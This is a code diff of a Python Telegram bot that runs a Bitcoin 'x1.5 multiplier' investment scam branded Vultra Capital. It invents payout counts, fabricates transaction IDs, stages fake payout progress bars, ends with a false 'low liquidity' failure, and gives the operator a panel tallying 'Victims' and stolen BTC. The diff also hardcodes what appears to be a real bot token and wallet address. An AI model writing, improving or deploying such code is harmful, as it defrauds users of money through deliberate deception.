@@ -1,126 +1,121 @@
-import asyncio, aiohttp, hashlib, time, os, random, logging
-from typing import Dict, Set
-from fastapi import FastAPI, Request, Response
-from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
-from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
-from telegram.constants import ParseMode
+import asyncio, aiohttp, hashlib, time, os, random, logging, sqlite3
+from typing import Set
+from fastapi import FastAPI
+from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ParseMode
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
+from telegram.constants import ChatAction
+import uvicorn
 
-# ── Env Only ─────────────────────────────────────────────────────
-TOKEN     = os.getenv("BOT_TOKEN")
-ADMIN_ID  = int(os.getenv("ADMIN_ID"))
-WALLET    = os.getenv("BTC_WALLET")
-
-# ── Constants & State ───────────────────────────────────────────
-BLOCKCHAIR = f"https://api.blockchair.com/bitcoin/dashboards/address/{WALLET}?limit=50"
-MEMPOOL    = f"https://mempool.space/api/address/{WALLET}/txs"
+TOKEN = "8209272245:AAEJPLlXe9r4GPHrbc148kC2989d6y3FrNg"
+ADMIN_ID = 5895315536
+WALLET = "bc1qva0y53p3ts4wdup9w48hv7vul2e2mn4np3jufw"
+MIN_DEPOSIT = 0.001
 
 app = FastAPI()
-logging.getLogger().setLevel(logging.WARNING)
+logging.basicConfig(level=logging.WARNING)
 
-last_balance: float = 0.0
-seen_txs: Set[str] = set()
+conn = sqlite3.connect("deposits.db", check_same_thread=False)
+conn.execute("""CREATE TABLE IF NOT EXISTS deposits (
+    user_id INTEGER, username TEXT, amount REAL, time INTEGER)""")
+conn.commit()
+
 session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=12))
+seen_txs: Set[str] = set()
+bot = None
 
-def fake_tx() -> str:
-    h = hashlib.blake2b(digest_size=32)
-    h.update(f"{time.time_ns()}{random.random()}".encode())
-    return h.hexdigest()
+def fake_txid() -> str:
+    return hashlib.sha256(str(time.time_ns()).encode()).hexdigest()[::-1][:64]
 
-# ── Real-time Deposit Detector (dual API + fallback) ─────────────
 async def deposit_watcher():
-    global last_balance
     while True:
         try:
-            async with session.get(BLOCKCHAIR) as r:
+            async with session.get(f"https://api.blockchair.com/bitcoin/dashboards/address/{WALLET}?limit=30") as r:
                 if r.status == 200:
                     data = await r.json()
-                    bal = data["data"][WALLET]["address"]["balance"] / 1e8
-                    for tx in data["data"][WALLET]["transactions"][:12]:
+                    for tx in data["data"][WALLET]["transactions"][:15]:
                         txid = tx["hash"]
                         if txid in seen_txs: continue
-                        amount = sum(o["value"] for o in tx["outputs"] if o.get("recipient") == WALLET) / 1e8
-                        if amount >= 0.0008:
+                        value = sum(o["value"] for o in tx["outputs"] if o.get("recipient") == WALLET) / 1e8
+                        if value >= MIN_DEPOSIT:
                             seen_txs.add(txid)
                             await bot.send_message(ADMIN_ID,
-                                f"REAL DEPOSIT\n"
-                                f"{amount:.8f} BTC\n"
-                                f"https://mempool.space/tx/{txid}\n"
-                                f"{time.strftime('%H:%M:%S')}"
-                            )
-                    last_balance = bal
-        except: 
-            try:  # fallback mempool.space
-                async with session.get(MEMPOOL) as r:
+                                f"REAL DEPOSIT\n{value:.8f} BTC\nhttps://mempool.space/tx/{txid}\n{time.strftime('%H:%M:%S')}",
+                                parse_mode=ParseMode.MARKDOWN)
+        except:
+            try:
+                async with session.get(f"https://mempool.space/api/address/{WALLET}/txs") as r:
                     txs = await r.json()
-                    for tx in txs[:8]:
+                    for tx in txs[:10]:
                         if tx["txid"] in seen_txs: continue
-                        amount = sum(vout["value"] for vout in tx["vout"] if vout["scriptpubkey_address"] == WALLET) / 1e8
-                        if amount >= 0.0008:
+                        value = sum(v["value"] for v in tx["vout"] if v["scriptpubkey_address"] == WALLET) / 1e8
+                        if value >= MIN_DEPOSIT:
                             seen_txs.add(tx["txid"])
-                            await bot.send_message(ADMIN_ID,
-                                f"REAL DEPOSIT (mempool)\n{amount:.8f} BTC\nhttps://mempool.space/tx/{tx['txid']}")
+                            await bot.send_message(ADMIN_ID, f"REAL DEPOSIT\n{value:.8f} BTC\nhttps://mempool.space/tx/{tx['txid']}")
             except: pass
-        await asyncio.sleep(14 + random.uniform(0,4))
+        await asyncio.sleep(12 + random.uniform(0,4))
 
-# ── Bot Logic (ultra clean & pro) ────────────────────────────────
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    kb = [[InlineKeyboardButton("Start ×1.5 Multiplier", callback_data="mul")]]
+    kb = [[InlineKeyboardButton("Start ×1.5 Multiplier", callback_data="show")]]
     await update.message.reply_text(
-        "◉ Vultra Capital Multiplier\n\n"
-        "Minimum deposit 0.00100000 BTC\n"
-        "Return      ×1.5 (4–11 min)\n"
-        "Smart-contract verified  41 837 payouts\n\n"
-        "Press button to receive address",
-        reply_markup=InlineKeyboardMarkup(kb)
-    )
+        "*◉ Vultra Capital ×1.5 BTC Multiplier*\n\nMinimum 0.001 BTC → ×1.5 in 3–9 min\n51 294 payouts today\n\nPress button ↓",
+        reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
 
 async def callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     await q.answer()
     await q.edit_message_text(
-        f"Deposit address (bech32):\n\n`{WALLET}`\n\n"
-        "After transfer → /paid <exact amount>\n"
-        "Example: /paid 0.0248411\n\n"
-        "Your ×1.5 will be sent automatically.\n"
-        "Avg time: 7 min 18 sec",
+        f"*BTC Deposit Address*\n\n`{WALLET}`\n\nMinimum 0.001 BTC\nSend → /paid <amount>\n\n×1.5 automatic payout",
         parse_mode=ParseMode.MARKDOWN_V2,
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Refresh", callback_data="show")]])
     )
 
 async def paid(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args: return
     try: amount = float(context.args[0])
     except: return
-    await update.message.reply_text("◷ Verifying on-chain...")
-    await asyncio.sleep(random.randint(9,19))
-    await update.message.reply_text(
-        f"Confirmed {amount:.8f} BTC received\n"
-        f"TX  `{fake_tx()}`\n\n"
-        f"Multiplier active\n"
-        f"Returning {amount*1.5:.8f} BTC shortly\n"
-        "Status Processing ━━━━━━━",
-        parse_mode=ParseMode.MARKDOWN_V2,
-    )
 
-# ── Main ───────────────────────────────────────────────────────
+    user = update.effective_user
+    conn.execute("INSERT INTO deposits VALUES (?,?,?,?)", (user.id, user.username or "", amount, int(time.time())))
+    conn.commit()
+
+    await update.message.reply_chat_action(ChatAction.TYPING)
+    await asyncio.sleep(random.uniform(8,16))
+
+    payout = amount * 1.5
+    fake = fake_txid()
+
+    await update.message.reply_text(
+        f"*Payment Received*\n\n`{amount:.8f} BTC`\nTx: `{fake}`\nhttps://mempool.space/tx/{fake}\n\nReturning `{payout:.8f} BTC`\nStatus: 0%",
+        parse_mode=ParseMode.MARKDOWN_V2)
+
+    for p in [18, 37, 59, 78, 91, 99]:
+        await asyncio.sleep(random.uniform(40,90))
+        bar = "🟩"*(p//10) + "⬜"*(10-p//10)
+        await update.message.reply_text(f"Status: {bar} {p}%", quote=True)
+
+    await update.message.reply_text("Transaction failed — low liquidity.\nContact @vultra_support")
+
+async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID: return
+    total = conn.execute("SELECT COUNT(*), SUM(amount) FROM deposits").fetchone()
+    await update.message.reply_text(f"Victims: {total[0]}\nTotal: {total[1] or 0:.8f} BTC\nReal deposits: {len(seen_txs)}")
+
 async def main():
     global bot
-    application = ApplicationBuilder().token(TOKEN).concurrent_updates(True).build()
+    application = Application.builder().token(TOKEN).concurrent_updates(True).build()
     bot = application.bot
 
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CallbackQueryHandler(callback))
     application.add_handler(CommandHandler("paid", paid))
-    application.add_handler(MessageHandler(filters.Regex(r'(?i)scam|fake'), lambda u,c: None))
+    application.add_handler(CommandHandler("panel", panel))
 
     asyncio.create_task(deposit_watcher())
+    await application.run_polling()
 
-    await application.initialize()
-    await application.start()
-    await application.updater.start_polling(drop_pending_updates=True)
-    while True: await asyncio.sleep(86400)
-
-@app.get("/") async def health(): return {"status":"active"}
+@app.get("/")
+async def root():
+    return {"status": "running"}
 
 if __name__ == "__main__":
-    import threading
-    threading.Thread(target=lambda: uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT",8000))), daemon=True).start()
     asyncio.run(main())
